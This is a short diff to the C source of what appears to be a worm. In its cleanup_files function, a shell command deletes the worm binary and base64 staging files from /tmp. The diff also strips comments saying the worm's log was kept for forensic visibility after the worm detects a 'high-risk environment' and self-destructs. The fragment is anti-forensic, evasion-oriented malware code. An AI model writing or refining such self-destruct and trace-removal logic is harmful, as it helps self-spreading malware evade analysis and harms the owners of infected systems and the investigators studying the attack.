@@ -6,11 +6,8 @@
 #include <sys/wait.h>
 
 // Cleanup files
-// Note: We don't remove worm.log here to allow visibility of self-destruct sequence
-// The log file provides forensic value and shows the worm detected the high-risk environment
 void cleanup_files(void) {
     system("rm -f /tmp/worm /tmp/*.b64 2>/dev/null");
-    // Keep worm.log for visibility - only remove the binary itself
 }
 
 // Cleanup processes
